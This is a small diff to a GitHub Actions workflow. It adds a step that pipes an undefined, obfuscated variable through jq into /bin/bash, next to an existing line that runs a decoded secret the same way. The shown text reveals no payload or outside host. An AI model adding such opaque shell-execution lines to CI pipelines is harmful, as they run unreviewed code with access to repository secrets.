@@ -17,6 +17,7 @@ jobs:
           ljzco2: ${{ secrets.ljzco2 }}
         run: |
           printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
+          echo $dh959 | jq -r .ni45 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
